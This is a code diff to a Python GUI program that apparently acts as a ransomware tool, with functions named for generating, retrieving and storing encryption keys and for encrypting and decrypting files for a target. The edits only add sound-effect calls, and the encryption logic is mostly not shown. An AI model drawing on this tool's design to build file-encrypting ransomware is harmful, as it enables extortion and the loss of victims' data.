@@ -143,6 +143,8 @@ def generate_key_ramson():
 
 	key_ramson = Fernet.generate_key()
 	ramsonKey.config(text = key_ramson)
+	playsound('bambu_click.mp3')
+	playsound('LLaveGenerada.mp3')
 
 def bring_key_ramson():
 
@@ -172,6 +174,8 @@ def bring_key_ramson():
 			dlt456 = miCursor13.fetchall()
 			key_ramson = dlt456[0][4]
 			ramsonKey.config(text = key_ramson)
+			playsound('bambu_click.mp3')
+			playsound('LlaveRecuperada.mp3')
 
 	miConexion13.commit()
 	miConexion13.close()
@@ -260,6 +264,7 @@ def encrypt_files_ramson_funct():
 					print(key_ramson)
 
 					playsound('bambu_click.mp3')
+					playsound('ArchivosEncriptadosExitosamente.mp3')
 
 				elif directory == '' or ramsonBird_message.get('1.0', 'end-1c') == '' or packet.get() == 0:
 
@@ -280,6 +285,7 @@ def encrypt_files_ramson_funct():
 					print(key_ramson)
 
 					playsound('bambu_click.mp3')
+					playsound('ArchivosEncriptadosExitosamente.mp3')
 
 				elif directory == '' or ramsonBird_message.get('1.0', 'end-1c') == '' or packet.get() == 0:
 
@@ -351,6 +357,8 @@ def decrypt_files_ramson_funct():
 				execution_decrypt_files(archivos2, key_ramson)
 				print(key_ramson)
 				ramsonBird_message.insert(tk.END, df202[0][5])
+				playsound('bambu_click.mp3')
+				playsound('ArchivosDesencriptadosExitosamente.mp3')
 
 			elif len(df202) == 0:
 
@@ -776,11 +784,12 @@ def receiver_ramson_actv():
 	if receiver_var.get() != '':
 
 		target_receiver_ramson = receiver_var.get()
-		#playsound('bambu_click.mp3')
+		playsound('bambu_click.mp3')
+		playsound('UsuarioArchivosEncriptadosExitoso.mp3')
 
 	elif receiver_var.get() == '':
 
-		playsound('bambu_click.mp3')
+		playsound('PrimeroNombreDestinatario.mp3')
 
 
 # ---------------------------------------------------------------------------------------------------------------------------
